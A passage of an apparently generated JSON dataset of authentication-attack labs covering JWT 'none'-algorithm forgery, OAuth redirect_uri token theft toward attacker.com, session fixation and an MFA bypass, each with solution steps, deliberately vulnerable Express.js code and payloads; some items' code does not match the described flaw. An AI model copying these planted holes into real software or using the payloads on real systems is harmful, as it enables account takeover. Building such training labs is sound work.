          "GET /my-account with session cookie after victim login",
          "Phishing link with session fixation"
        ]
      },
      {
        "Lab scenario": "JWT tampering via 'none' algorithm attack",
      
        "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication, but fails to validate the algorithm in the JWT header. The application accepts tokens signed with 'none' algorithm, allowing attackers to forge arbitrary tokens. To solve: Forge a valid JWT token as admin using 'none' algorithm and access the /admin panel.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Burp Suite or Postman to intercept a JWT after logging in with any user.",
          "Decode the JWT using jwt.io and inspect the header. Note the 'alg' field.",
          "Craft a new JWT manually with header: {\"alg\":\"none\",\"typ\":\"JWT\"} and payload: {\"username\":\"admin\"}. Leave signature blank.",
          "Replace the JWT in the Authorization: Bearer header with the forged token.",
          "Send request to GET /admin and verify access is granted."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
      
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "Authorization: Bearer <forged_token>",
          "Modified JWT with alg:none"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration exploiting open redirect",
      
        "Lab Description": "The application uses OAuth for third-party login but trusts any redirect URI without validation. This enables attackers to manipulate the redirect_uri parameter to capture tokens. To solve: Abuse the redirect URI to intercept Carlos's access token and use it to access his profile.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use OWASP ZAP to inspect the OAuth login request and locate the redirect_uri parameter.",
          "Modify the redirect_uri to point to your controlled server (e.g., https://attacker.com/callback).",
          "Craft a phishing link with the manipulated redirect and send it to Carlos (simulate click).",
          "Capture the token from the redirected GET request to your server.",
          "Use Postman to send GET /profile with Authorization: Bearer <captured_token> to access Carlos's data."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id === 'trusted-client') { res.redirect(`${redirect_uri}?token=carlos-access-token`); } else { res.status(400).send('Invalid client'); } }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-access-token') { res.send('Profile: Carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(5000);",
      
        "payloads": [
          "https://target.com/auth?client_id=trusted-client&redirect_uri=https://attacker.com/callback",
          "Authorization: Bearer carlos-access-token",
          "Phishing URL with redirect_uri injection"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Predictable Token Injection in OAuth Flow",
        "Lab Description": "The OAuth implementation in this application mishandles session tokens when delegating login to third-party providers. The session identifier is not regenerated upon successful login. The application accepts a session token from unauthenticated users and continues using it post-authentication. To solve: fixate Carlos's session ID prior to login, then hijack his session after he logs in using the third-party flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp Suite and proxy the OAuth login flow; click 'Log in via OAuth Provider' and intercept the initial /auth request.",
          "Inject a predefined session token by modifying the Set-Cookie header to `sessionid=attackerSession123` before redirection occurs.",
          "Allow the OAuth flow to proceed to completion. Observe that the session identifier persists after login, confirming session fixation.",
          "Send the link to Carlos (assume controlled delivery). Once Carlos logs in using the crafted link, use the fixed session cookie `sessionid=attackerSession123` to hijack the session.",
          "Access /account page while reusing the fixed session token. The lab is solved when Carlos's profile loads."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/auth', (req, res) => { const redirectUri = 'http://localhost:4000/callback'; res.redirect(`https://oauth.example.com/login?redirect_uri=${redirectUri}`); }); app.get('/callback', (req, res) => {   req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) { res.send(`Welcome back, ${req.session.user}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "sessionid=attackerSession123",
          "Set-Cookie: sessionid=attackerSession123; Path=/; HttpOnly",
          "OAuth redirect link with fixed session injected"
        ]
      },
      {
        "Lab scenario": "JWT Token Forgery via None Algorithm Exploit",
        "Lab Description": "This application uses JWT tokens to authenticate users but fails to verify the algorithm securely. If the algorithm field is set to 'none', the backend skips signature validation entirely. To solve: forge a JWT token for user 'carlos' by changing the algorithm to 'none' and access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT token using Burp Suite or browser dev tools during a login request.",
          "Decode the JWT using jwt.io or similar tool and observe it uses HS256 or RS256.",
          "Modify the header to set \"alg\": \"none\" and change the payload's username to \"carlos\".",
          "Remove the signature section entirely to reflect a valid none-algorithm JWT structure.",
          "Send a GET /account request with the Authorization header set to the forged token and verify Carlosâ€™s profile is accessible."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = payload.username; } else { req.user = jwt.verify(token, SECRET).username; } res.send(`Welcome ${req.user}`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [modified_none_jwt]",
          "{\"alg\":\"none\"}, payload:{\"username\":\"carlos\"}, no signature"
        ]
      },
      {
        "Lab scenario": "MFA Bypass via Password Reset Flow",
        "Lab Description": "This application's MFA enforcement fails during the password reset flow. After a password reset, users are logged in without triggering 2FA enforcement. To solve: trigger a password reset for Carlos, set a new password, then access his account page without MFA challenge.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "In Burp Suite, initiate a password reset using Carlosâ€™s email or username.",
          "Intercept the reset link in your email panel and extract the reset token from the query string.",
          "Use the reset token to set a new password for Carlos via POST /reset-password.",
          "Observe that the application automatically logs in the user without triggering the 2FA process.",
          "Navigate to /account while authenticated to Carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let users = [{ username: 'carlos', password: 'initial', mfa: true }]; let tokens = {}; app.post('/forgot-password', (req, res) => { const token = 'reset123'; tokens[req.body.username] = token; res.send('Reset link sent'); }); app.get('/reset-password', (req, res) => { const { token, user } = req.query; if (tokens[user] === token) { res.send(`<form method='POST'><input name='newPassword'><input type='hidden' name='username' value='${user}'><button>Submit</button></form>`); } else { res.status(403).send('Invalid token'); } }); app.post('/reset-password', (req, res) => { const { username, newPassword } = req.body; const user = users.find(u => u.username === username); if (user) { user.password = newPassword; res.send(`Welcome ${username}`); } else { res.status(400).send('User not found'); } }); app.listen(4000, () => console.log('MFA Bypass via Reset running'));",
        "payloads": [
          "/reset-password?user=carlos&token=reset123",
          "POST /reset-password {username: 'carlos', newPassword: 'newpass123'}",
          "Navigate to /account after reset (no MFA prompt)"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion vulnerability in API-based login",
        "Lab Description": "This lab uses JWTs to manage user sessions via a stateless REST API. The backend fails to enforce strict algorithm verification, allowing attackers to tamper with the token header and payload to bypass authentication. The application verifies tokens but trusts user-supplied algorithm types. To solve: forge a token that grants access to the admin dashboard without knowing the secret key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman or Burp Suite to intercept the token after logging in with a low-privilege user.",
          "Decode the JWT using jwt.io and observe the alg header is set to HS256 and a 'role' claim is present.",
          "Modify the alg field from HS256 to 'none', delete the signature section, and change the role claim to 'admin'.",
          "Replay the forged token in the Authorization header of a GET /admin request.",
          "Confirm access to /admin by checking for the presence of the admin dashboard interface."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'admin123') { const token = jwt.sign({ user: 'admin', role: 'admin' }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } if (username === 'guest' && password === 'guest123') { const token = jwt.sign({ user: 'guest', role: 'user' }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid login'); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { return res.send('Welcome to the admin dashboard'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login redirect logic",
        "Lab Description": "This lab uses cookies to manage sessions. Upon login, the session ID is preserved if already present. An attacker can exploit this by sharing a pre-set session cookie with a victim and then logging in with that same session. To solve: fix a session with a victim, then hijack their authenticated session after they log in.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture the Set-Cookie header before logging in.",
          "Send a crafted phishing URL to the victim containing the fixed session ID as a cookie.",
          "Wait for the victim to log in using the fixed session.",
          "Reuse the same session ID cookie to access the victim's authenticated resources (e.g., /account).",
          "Verify access to the victim's account page and sensitive data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { alice: 'alice123', bob: 'bob123' }; app.get('/login', (req, res) => { const { username, password } = req.query; const sid = req.cookies.sid || Math.random().toString(36).substring(2); if (users[username] && users[username] === password) { sessions[sid] = username; res.cookie('sid', sid); return res.send(`Welcome ${username}`); } res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { return res.send(`Account page of ${user}`); } res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "GET /login?username=alice&password=alice123 with Cookie: sid=abc123",
          "GET /account with Cookie: sid=abc123"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in callback endpoint",
        "Lab Description": "This lab uses a third-party OAuth provider for user authentication. The callback endpoint is vulnerable to an open redirect allowing an attacker to intercept tokens. To solve: manipulate the redirect_uri to leak the authorization code to an attacker-controlled server and use it to impersonate the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to inspect the OAuth login flow and capture the authorization URL with a redirect_uri parameter.",
          "Modify redirect_uri to point to https://attacker.com/callback (your server).",
          "Send the malicious login URL to the victim.",
          "Capture the leaked authorization code on your server.",
          "Use Postman to exchange the code for an access token and call the victim's /my-account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post('https://oauth.example.com/token', { code }); const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenRes.data.access_token}` } }); res.redirect(redirect_uri || '/welcome'); } catch (e) { res.status(500).send('OAuth failure'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Callback Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://example.com/oauth/authorize?client_id=abc123&redirect_uri=https://attacker.com/callback&response_type=code",
          "POST https://oauth.example.com/token with code=leaked_code",
          "Authorization: Bearer <stolen_token>"
        ]
      },
      {
        "Lab scenario": "JWT 'alg' field tampering to bypass signature validation",
        "Lab Description": "This lab's authentication system uses JWTs for session management. The server is misconfigured to trust JWTs even when the 'alg' field is set to 'none'. The application does not properly validate the integrity of the JWT. To solve: tamper with the JWT to impersonate the user 'carlos' and access their account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the login request and capture the JWT token issued after a successful login.",
          "Send the JWT to jwt.io and decode the payload. Note the structure and the header using HS256 algorithm.",
          "Manually modify the header to {\"alg\": \"none\"} and change the payload's username to 'carlos'. Remove the signature portion of the JWT.",
          "Send the tampered token using Burp Repeater in the Authorization header: Bearer [modified-token]",
          "Observe if you gain access to Carlosâ€™s account page, confirming the bypass."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'verysecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.username; return res.send(`Welcome to ${user}'s account.`); } try { const verified = jwt.verify(token, 'verysecret'); return res.send(`Welcome to ${verified.username}'s account.`); } catch { return res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Header: {\"alg\": \"none\"}, Payload: {\"username\":\"carlos\"}, Signature: (empty)",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
        "Lab Description": "This lab has a misconfigured OAuth 2.0 implementation that accepts unvalidated redirect_uris. An attacker can manipulate the redirect flow to obtain a valid authorization code for another user. To solve: steal Carlos's token via redirect_uri manipulation and use it to access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to initiate an OAuth flow using the labâ€™s /oauth/authorize endpoint and capture the redirect with code.",
          "Change the redirect_uri parameter to a malicious URL under your control and resend the request. The server does not validate it properly.",
          "Send Carlos a phishing link that initiates the OAuth flow and redirects the response to your listener server.",
          "Capture the authorization code in your listener server logs. Exchange it for an access token using /oauth/token.",
          "Use this token in the Authorization header to access Carlosâ€™s account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode-carlos'; const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'token-carlos' }); } else { res.status(400).send('Invalid code'); } }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') return res.send('Carlos Account Data'); return res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://vulnerable-app.com/oauth/authorize?client_id=xyz&redirect_uri=https://attacker.com/capture&state=1234",
          "POST /oauth/token {\"code\":\"authcode-carlos\"}",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation through predictable session ID generation",
        "Lab Description": "This labâ€™s login system accepts user-supplied session IDs, and the session ID generation is weak and predictable. The application reuses the session ID if set before login. To solve: fix a known session ID before Carlos logs in and hijack his session afterward.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Using OWASP ZAP, intercept the request to /login and observe the Set-Cookie response header. Note the session ID format (e.g., sess-XXXX).",
          "Send a request to /login with a crafted Cookie header: sessionid=sess-9999 and credentials of your own account. Confirm that the session ID is reused.",
          "Logout and clear your session. Send Carlos a phishing link that sets the sessionid to sess-9999 via HTTP response injection.",
          "Wait until Carlos logs in using that session. Use Burp to send a GET /account with Cookie: sessionid=sess-9999.",
          "Observe if Carlosâ€™s account data is returned, confirming successful session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid || `sess-${Math.floor(Math.random() * 10000)}`; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[sid] = user.username; res.cookie('sessionid', sid); res.send('Logged in'); }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; const username = sessions[sid]; if (username === 'carlos') return res.send('Welcome Carlos'); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Cookie: sessionid=sess-9999 before login",
          "Phishing link using <meta http-equiv='Set-Cookie' content='sessionid=sess-9999'>",
          "GET /account with Cookie: sessionid=sess-9999"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Login Without Session Renewal",
        "Lab Description": "This lab demonstrates a session fixation vulnerability in which the session ID remains unchanged after a successful login. The application does not regenerate the session identifier during authentication. To solve: Fixate a session on the victim and log in as Carlos by reusing the same session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture a session cookie issued to you before login.",
          "Send the session cookie to the victim using a reflected XSS or phishing attack (assume phishing succeeded for this lab).",
          "Have the victim log in with their credentials using the pre-fixed session.",
          "Reuse the same session cookie in your browser or Burp to gain authenticated access.",
          "Access /account/carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.user = username; res.redirect('/account'); }); app.get('/account', (req, res) => { if (!req.session.user) return res.status(401).send('Not logged in'); res.send('Welcome ' + req.session.user); }); app.listen(3000);",
        "payloads": [
          "Pre-login session cookie: sessionid=abc123; reused after victim login",
          "Phished login page link with fixed session",
          "Manual reuse of session: document.cookie='sessionid=abc123'"
        ]
      },
      {
        "Lab scenario": "JWT Signature Forgery via Error Leak in Token Validation",
        "Lab Description": "The backend uses JWTs for session management, but it discloses the secret key via verbose stack traces when given a malformed token. The application fails to suppress internal verification errors. To solve: Forge a JWT as Carlos and access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Send a malformed JWT using Burp Repeater with an invalid signature and capture the verbose error message.",
          "Extract the hardcoded secret key from the leaked error.",
          "Craft a new JWT using HS256 algorithm and set payload { \"username\": \"carlos\" }.",
          "Sign the JWT using the recovered secret and insert it in the Authorization header.",
          "Send a GET request to /profile with the forged token to verify Carlosâ€™s access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.get('/profile', (req, res) => { try { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, secret); if (decoded.username === 'carlos') return res.send('Welcome Carlos'); res.send('Access denied'); } catch (e) { res.status(500).send(e.stack); } }); app.listen(3000);",
        "payloads": [
          "JWT with 'alg':'HS256', payload:{'username':'carlos'}, signed using 'supersecretkey'",
          "Malformed token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..invalidsig",
          "Authorization: Bearer <forged_token>"
        ]
      },
      {
        "Lab scenario": "Open Redirect in OAuth Flow",
        "Lab Description": "This OAuth-based login mechanism fails to properly validate the redirect_uri parameter. The application allows an arbitrary domain to receive tokens. To solve: Manipulate the redirect URI to capture Carlosâ€™s OAuth code, then exchange it for an access token and access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to intercept the OAuth login request and modify the redirect_uri to your malicious server endpoint (e.g., https://attacker.net/callback).",
          "Send the link to the victim (Carlos) via phishing to trick him into logging in.",
          "Capture the code parameter received at your server from the victim's login.",
          "Exchange the OAuth code at the /oauth/token endpoint using a valid client_id to obtain an access token.",
          "Use the access token to request /user/profile and confirm Carlosâ€™s identity."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (response_type !== 'code') return res.status(400).send('Invalid response_type'); const code = 'abc123';  return res.redirect(redirect_uri + '?code=' + code); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'abc123') return res.json({ access_token: 'token_carlos' }); res.status(400).send('Invalid code'); }); app.get('/user/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token_carlos') return res.send('Carlos Profile'); res.status(401).send('Unauthorized'); }); app.listen(3000);",
        "payloads": [
          "https://vulnerable.site/auth?redirect_uri=https://attacker.net/callback&client_id=trusted&response_type=code",
          "POST /oauth/token { code: abc123 }",
          "Authorization: Bearer token_carlos"
        ]
      },
      {
        "Lab scenario": "Session Fixation in cookie-based login system",
        "Lab Description": "The application uses session tokens to track users post-login but does not regenerate them after successful authentication. This allows attackers to fixate a known session ID. The application accepts a session cookie pre-authentication and reuses it post-login without renewal. To solve: force a victim to authenticate under an attacker-supplied session and hijack their session to access their profile.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and capture the unauthenticated session cookie (sessionid).",
          "2. Share this sessionid with the victim and craft a phishing link that sets this cookie in the victim's browser using JavaScript or an open redirect.",
          "3. Instruct the victim to log in normally with the fixed session.",
          "4. Wait until the victim has authenticated using the fixated session.",
          "5. Reuse the same sessionid in your browser and access /my-account to gain unauthorized access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = { authenticated: false }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const session = sessions[req.cookies.sessionid]; const user = users.find(u => u.username === username && u.password === password); if (user && session) { session.authenticated = true; session.username = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionid]; if (session && session.authenticated) { res.send(`Welcome ${session.username}`); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
        "payloads": [
          "document.cookie = 'sessionid=attackerknownvalue; path=/';",
          "https://victim-site.com/login?sessionid=attackerknownvalue",
          "Manually inject cookie in browser: sessionid=attackerknownvalue"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm",
        "Lab Description": "This application uses JWTs for authentication. However, it incorrectly trusts tokens with the 'alg' header set to 'none' and does not verify the signature. This allows an attacker to forge arbitrary tokens. To solve: craft a JWT granting access to the 'admin' user and access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in to the application using your own credentials and intercept the JWT token using Burp.",
          "2. Decode the JWT using jwt.io or similar tool and note the structure of the header, payload, and signature.",
          "3. Modify the header to use 'alg':'none' and change the payload's 'user':'admin'.",
          "4. Remove the signature entirely and base64url-encode the new token.",
          "5. Replace the original Authorization Bearer token with your forged JWT and access /admin-dashboard to verify the attack worked."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'secret', role: 'admin' }, { username: 'user', password: 'pass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ user: username, role: user.role }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"user\":\"admin\",\"role\":\"admin\"}",
          "Token: base64url(header).base64url(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in redirect_uri parameter",
        "Lab Description": "This OAuth implementation fails to validate the redirect_uri properly during authorization. Attackers can manipulate the redirect_uri to hijack authorization codes. The application whitelists any subdomain and doesn't enforce exact matching. To solve: intercept a user's OAuth flow and steal the authorization code to log in as them.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Initiate an OAuth login flow and observe the authorization URL, especially the redirect_uri.",
          "2. Register a subdomain like attacker.victim-oauth.com and setup a web server to receive redirected codes.",
          "3. Modify the redirect_uri to point to your malicious subdomain and trick the victim into clicking the link.",
          "4. Capture the authorization code from your server logs once the victim logs in and gets redirected.",
          "5. Exchange the stolen code for an access token and use it to call /user-info or /account with the victim's token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/callback', (req, res) => { const { code } = req.query; axios.post('https://oauth-provider/token', { code }).then(response => { res.send('Access granted: ' + response.data.token); }).catch(err => res.status(500).send('Error exchanging code')); }); app.listen(4000);",
        "payloads": [
          "https://auth.victim.com/auth?redirect_uri=https://attacker.victim.com/callback",
          "https://auth.victim.com/auth?redirect_uri=https://attacker.com",
          "Capture: GET /callback?code=xyz123",
          "POST /token { code: 'xyz123' }"
        ]
      },
      {
        "Lab scenario": "Session Fixation in OAuth Authorization Flow",
        "Lab Description": "This lab demonstrates a session fixation vulnerability during OAuth login using the Authorization Code grant type. The application mistakenly trusts the session cookie issued before OAuth verification is complete. The application fails to bind the session cookie to the OAuth authorization code flow. To solve: exploit the session fixation to log in as Carlos by abusing the OAuth login flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the login request and initiate OAuth login using your own account. Note the session cookie set during this step.",
          "Capture the redirection URL after clicking 'Log in with OAuth' and note the OAuth state and session values.",
          "Craft a phishing link containing your own session ID and send it to the victim. Use an HTML-based delivery payload with a fake login prompt.",
          "Once Carlos clicks the link and authorizes via OAuth, your session is upgraded to Carlos's identity due to session fixation.",
          "Verify the session by visiting /my-account with your original session cookie still intact."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'sessionFix', resave: false, saveUninitialized: true })); app.get('/auth/login', (req, res) => { req.session.oauth_initiated = true; res.redirect(`https://authserver.com/oauth?state=${req.session.id}`); }); app.get('/auth/callback', (req, res) => { const user = req.query.user; if (req.session.oauth_initiated) { req.session.user = user; res.redirect('/my-account'); } else { res.status(403).send('OAuth flow not initiated.'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "https://target-app.com/auth/login?session=attackerSessionID",
          "Phishing page with <meta http-equiv='refresh'> to redirect to OAuth URL with preset session cookie",
          "https://target-app.com/my-account (with pre-authenticated attacker cookie)"
        ]
      },
      {
        "Lab scenario": "JWT None Algorithm Bypass in GraphQL Authorization Header",
        "Lab Description": "This lab simulates an insecure JWT implementation within a GraphQL API that incorrectly allows tokens using the 'none' algorithm. The backend uses the Authorization Bearer token to authenticate users but skips verification if the algorithm is set to 'none'. To solve: forge a JWT with 'alg: none' and impersonate Carlos to access his profile.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to inspect the GraphQL endpoint at /graphql and issue a query with your valid token.",
          "Decode the JWT using jwt.io or a similar tool and observe the payload and headers.",
          "Manually craft a token with 'alg' set to 'none' and payload set to { \"username\": \"carlos\" } without signing.",
          "Replace the Authorization header with 'Bearer [forged_token]' and resend the GraphQL query to fetch user data.",
          "Verify access by fetching Carlos's profile details or settings using a GraphQL query like { me { username, email } }."
        ],
        "Vulnerability name": "Authentication",
